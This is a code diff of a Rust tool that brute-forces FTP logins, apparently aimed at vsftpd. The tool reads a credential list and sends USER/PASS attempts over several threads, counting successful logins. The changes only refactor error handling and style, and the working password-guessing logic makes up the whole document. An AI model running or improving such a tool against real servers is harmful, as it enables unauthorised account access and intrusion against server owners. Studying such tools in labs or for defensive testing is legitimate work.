@@ -35,7 +35,7 @@ fn main() -> Result<()> {
     let now = Instant::now();
     let host = args.host;
     let mut cred_file = BufReader::new(File::open(&args.credentials)?);
-    let cred_count = get_cred_count(&mut cred_file);
+    let cred_count = get_cred_count(&mut cred_file)?;
     println!("credential count {}", cred_count);
     // vsftpd default max conn = 5
     let pool = ThreadPool::new(4);
@@ -53,7 +53,12 @@ fn main() -> Result<()> {
                 Some(chunk) => {
                     let mut buffer = [0; MAX_MESSAGE_SIZE];
                     let mut stream = TcpStream::connect(host).unwrap();
-                    stream.read(&mut buffer).unwrap();
+                    match stream.read(&mut buffer) {
+                        Ok(..) => {}
+                        Err(err) => {
+                            panic!("{}", err)
+                        }
+                    }
                     if buffer[..3] == RDY_FOR_NEW_USERS {
                         for cred in chunk {
                             match attempt(&cred, &mut stream, &sender) {
@@ -88,7 +93,7 @@ fn main() -> Result<()> {
     }
     println!("Total attempts {}", receiver.try_iter().count());
     println!("Total time elapsed: {}", now.elapsed().as_secs());
-    return Ok(());
+    Ok(())
 }
 
 fn attempt(credential: &str, stream: &mut TcpStream, sender: &Sender<u32>) -> Result<u8> {
@@ -100,27 +105,37 @@ fn attempt(credential: &str, stream: &mut TcpStream, sender: &Sender<u32>) -> Re
             }
         }
         println!("attempting: {} {}", username, password);
-        stream.write(format!("USER {}\r\n", username).as_bytes())?;
+        stream.write_all(format!("USER {}\r\n", username).as_bytes())?;
         let mut buffer = [0; MAX_MESSAGE_SIZE];
-        stream.read(&mut buffer)?;
+        match stream.read(&mut buffer) {
+            Ok(..) => {}
+            Err(err) => {
+                panic!("{}", err)
+            }
+        }
         if buffer[..3] == USRNAME_OK {
-            stream.write(format!("PASS {}\r\n", password).as_bytes())?;
-            stream.read(&mut buffer)?;
+            stream.write_all(format!("PASS {}\r\n", password).as_bytes())?;
+            match stream.read(&mut buffer) {
+                Ok(..) => {}
+                Err(err) => {
+                    panic!("{}", err)
+                }
+            }
             if buffer[..3] == LOGGED_IN {
                 return Ok(1);
             }
         }
     }
-    return Ok(0);
+    Ok(0)
 }
 
-fn get_cred_count(reader: &mut BufReader<File>) -> usize {
+fn get_cred_count(reader: &mut BufReader<File>) -> Result<usize> {
     let mut cred_count: usize = reader.lines().count();
     if cred_count % CHUNK_AMOUNT > 0 {
         cred_count = cred_count + (CHUNK_AMOUNT - cred_count % CHUNK_AMOUNT)
     }
-    reader.seek(SeekFrom::Start(0));
-    return cred_count;
+    reader.seek(SeekFrom::Start(0))?;
+    Ok(cred_count)
 }
 
 fn get_chunk(mut reader: MutexGuard<BufReader<File>>) -> Option<Vec<String>> {
